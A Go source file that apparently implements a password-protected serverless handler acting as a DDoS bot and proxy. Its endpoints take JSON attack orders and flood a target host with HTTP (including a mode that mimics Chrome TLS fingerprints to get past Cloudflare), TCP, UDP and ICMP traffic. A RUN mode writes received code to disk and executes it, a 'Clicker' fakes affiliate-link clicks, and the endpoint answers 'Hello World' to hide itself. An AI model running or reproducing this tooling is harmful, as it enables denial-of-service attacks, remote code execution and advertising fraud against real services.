package handler

import (
	crypto_rand "crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"

	httpf "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
)

var (
	HashManager = make(map[string]bool)

	user_agent = []string{
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
		"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
		"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
		"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
		"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
		"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
	}
)

type Attack struct {
	Host   string `json:"host"`
	Thread int    `json:"thread"`
	Method string `json:"method"`
	Hash   string `json:"hash"`

	Headers []string `json:"headers"`
	B       Binary
}

type Binary struct {
	Code string `json:"code"`
}

type AttackManager struct {
	Managers map[string]*Attack
}

func Role(Attack AttackManager) {
	for _, value := range Attack.Managers {
		SelectMethod(value)
	}
}

func SelectMethod(value *Attack) {
	var wg sync.WaitGroup
	switch value.Method {
	case "CF-GET":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "GET", value.Headers, value.Thread, &wg)
	case "CF-POST":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "POST", value.Headers, value.Thread, &wg)
	case "CF-PUT":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "PUT", value.Headers, value.Thread, &wg)
	case "CF-DELETE":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "DELETE", value.Headers, value.Thread, &wg)
	case "CF-PATCH":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "PATCH", value.Headers, value.Thread, &wg)
	case "CF-HEAD":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "HEAD", value.Headers, value.Thread, &wg)
	case "CF-OPTIONS":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "OPTIONS", value.Headers, value.Thread, &wg)
	case "CF-TRACE":
		wg.Add(1)
		go CF_BYP(value.Host, value.B.Code, "TRACE", value.Headers, value.Thread, &wg)
	case "GET":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "GET", value.Headers, value.Thread, &wg)
	case "POST":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "POST", value.Headers, value.Thread, &wg)
	case "PUT":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "PUT", value.Headers, value.Thread, &wg)
	case "DELETE":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "DELETE", value.Headers, value.Thread, &wg)
	case "PATCH":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "PATCH", value.Headers, value.Thread, &wg)
	case "HEAD":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "HEAD", value.Headers, value.Thread, &wg)
	case "OPTIONS":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "OPTIONS", value.Headers, value.Thread, &wg)
	case "TRACE":
		wg.Add(1)
		go REQ(value.Host, value.B.Code, "TRACE", value.Headers, value.Thread, &wg)
	case "TCP":
		wg.Add(1)
		go TCP(value.Host, value.B.Code, value.Thread, &wg)
	case "UDP":
		wg.Add(1)
		go UDP(value.Host, value.Thread, &wg)
	case "ICMP":
		wg.Add(1)
		go ICMP(value.Host, value.B.Code, value.Thread, &wg)
	case "RUN":
		wg.Add(1)
		RUN(value.B.Code)
	case "CLICK":
		wg.Add(1)
		go Clicker(value.Host, value.Headers, value.Thread, &wg)
	}
	wg.Wait()
}

func RUN(Code string) {
	file, err := os.Create("temp.go")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()
	file.Write([]byte(Code))
	cmd := exec.Command("go", "run", "temp.go")
	cmd.Run()
}

func ICMP(Host, Code string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			icmpPacket := []byte{
				8, 0,
				0, 0,
				0, 0, 0, 0,
				0, 0, 0, 0,
			}

			checksum := calculateChecksum(icmpPacket)
			icmpPacket[2] = byte(checksum >> 8)
			icmpPacket[3] = byte(checksum & 255)

			conn, err := net.Dial("ip4:icmp", Host)
			if err != nil {
				conn, err = net.Dial("ip6:ipv6-icmp", Host)
				if err != nil {
					fmt.Println(err)
					return
				}
			}
			defer conn.Close()

			if _, err := conn.Write(icmpPacket); err != nil {
				fmt.Println(err)
				return
			}
		}()
	}
	wg.Wait()
}

func calculateChecksum(packet []byte) uint16 {
	var sum uint32

	for i := 0; i < len(packet)-1; i += 2 {
		sum += uint32(packet[i+1])<<8 | uint32(packet[i])
	}

	if len(packet)%2 == 1 {
		sum += uint32(packet[len(packet)-1])
	}

	sum = (sum >> 16) + (sum & 0xffff)
	sum += sum >> 16

	return uint16(^sum)
}

func UDP(Host string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			buffer := make([]byte, 1024)
			conn, err := net.Dial("udp", Host)
			if err != nil {
				fmt.Println(err)
				return
			}
			_, err = crypto_rand.Read(buffer)
			if err != nil {
				fmt.Println(err)
				return
			}
			conn.Write(buffer)
			conn.Close()
		}()
	}
	wg.Wait()
}

func TCP(Host, Code string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.Dial("tcp", Host)
			if err != nil {
				fmt.Println(err)
				return
			}
			conn.Write([]byte(Code))
			conn.Close()
		}()
	}
	wg.Wait()
}

func REQ(Host, Body, method string, Headers []string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := http.Client{}
			req, err := http.NewRequest(method, Host, strings.NewReader(Body))
			if err != nil {
				fmt.Println(err)
				return
			}
			for _, r := range Headers {
				s := strings.Split(r, ":")
				if len(s) != 2 {
					break
				}
				req.Header.Set(s[0], s[1])
			}
			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
			client.Do(req)
		}()
	}
	wg.Wait()
}

func CF_BYP(Host, Body, method string, Headers []string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			jar := tls_client.NewCookieJar()
			options := []tls_client.HttpClientOption{
				tls_client.WithTimeoutSeconds(30),
				tls_client.WithClientProfile(profiles.Chrome_105),
				tls_client.WithNotFollowRedirects(),
				tls_client.WithCookieJar(jar),
			}

			client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
			if err != nil {
				fmt.Println(err)
				return
			}
			req, err := httpf.NewRequest(method, Host, strings.NewReader(Body))
			if err != nil {
				fmt.Println(err)
				return
			}
			for _, r := range Headers {
				s := strings.Split(r, ":")
				if len(s) != 2 {
					break
				}
				req.Header.Set(s[0], s[1])
			}
			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
			client.Do(req)
		}()
	}
	wg.Wait()
}

func Clicker(Host string, Headers []string, Thread int, wgs *sync.WaitGroup) {
	defer wgs.Done()
	var wg sync.WaitGroup
	for i := 0; i <= Thread; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			jar := tls_client.NewCookieJar()
			options := []tls_client.HttpClientOption{
				tls_client.WithTimeoutSeconds(30),
				tls_client.WithClientProfile(profiles.Chrome_112),
				tls_client.WithNotFollowRedirects(),
				tls_client.WithCookieJar(jar),
			}

			client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
			if err != nil {
				return
			}
			URL, err := Clicked(client, Host)
			if err != nil {
				fmt.Println(err)
				return
			}
			data, err := ReqRedirect(client, URL)
			if err != nil {
				fmt.Println(err)
				return
			}
			ViewContent(client, data)
		}()
	}
	wg.Wait()
}

func Clicked(client tls_client.HttpClient, URL string) (string, error) {
	req, err := httpf.NewRequest("GET", URL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", "https://eptrone.com/")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	s, err := resp.Location()
	if err != nil {
		return "", err
	}
	return s.String(), nil
}

func ReqRedirect(client tls_client.HttpClient, URL string) (string, error) {
	req, err := httpf.NewRequest("GET", URL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("authority", "lm.a8.net")
	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("accept-language", "ja,en-US;q=0.9,en;q=0.8")
	req.Header.Set("cookie", "A8_SHARED=aUPcjoisZRu43GUPq")
	req.Header.Set("referer", "https://eptrone.com/")
	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "document")
	req.Header.Set("sec-fetch-mode", "navigate")
	req.Header.Set("sec-fetch-site", "cross-site")
	req.Header.Set("sec-fetch-user", "?1")
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	s, err := resp.Location()
	if err != nil {
		return "", err
	}
	return s.String(), nil
}

func ViewContent(client tls_client.HttpClient, URL string) {
	req, err := httpf.NewRequest("GET", URL, nil)
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", "https://eptrone.com/")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	client.Do(req)
}

func Hello(c echo.Context) error {
	body, err := io.ReadAll(c.Request().Body)
	if err != nil {
		fmt.Println(err)
		return c.String(http.StatusOK, "Hello World")
	}
	password := c.Request().Header.Get("X-Password")
	if password != "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf" {
		return c.String(http.StatusOK, "Hello World")
	}
	var Attacks AttackManager

	err = json.Unmarshal(body, &Attacks)
	if err != nil {
		fmt.Println(err)
		return c.String(http.StatusOK, "Hello World")
	}

	Role(Attacks)
	return c.String(http.StatusOK, "Attacked")
}

func HTTP(c echo.Context) error {
	password := c.Request().Header.Get("X-Password")
	if password != "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf" {
		return c.String(http.StatusOK, "Hello World")
	}

	URL := c.Request().Header.Get("X-Host")

	c.Request().Header.Del("X-Password")
	c.Request().Header.Del("X-Host")

	client := http.Client{}

	req, err := http.NewRequest(c.Request().Method, URL, c.Request().Body)
	if err != nil {
		return err
	}

	for key, value := range c.Request().Header {
		if key == "X-Password" || key == "X-Host" {
			continue
		}
		for _, value2 := range value {
			req.Header.Set(key, value2)
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	return c.String(resp.StatusCode, string(body))
}

func TLS(c echo.Context) error {
	password := c.Request().Header.Get("X-Password")
	if password != "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf" {
		return c.String(http.StatusOK, "Hello World")
	}

	URL := c.Request().Header.Get("X-Host")

	c.Request().Header.Del("X-Password")
	c.Request().Header.Del("X-Host")

	jar := tls_client.NewCookieJar()
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Chrome_112),
		tls_client.WithNotFollowRedirects(),
		tls_client.WithCookieJar(jar),
	}

	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
	if err != nil {
		return err
	}

	req, err := httpf.NewRequest(c.Request().Method, URL, c.Request().Body)
	if err != nil {
		return err
	}

	for key, value := range c.Request().Header {
		if key == "X-Password" || key == "X-Host" {
			continue
		}
		for _, value2 := range value {
			req.Header.Set(key, value2)
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	return c.String(resp.StatusCode, string(body))
}

func Handler(w http.ResponseWriter, r *http.Request) {
	//go Rule()
	e := echo.New()
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	e.GET("/api/hello", Hello)
	e.Any("/api/http", HTTP)
	e.Any("/api/tls", TLS)

	e.ServeHTTP(w, r)
}
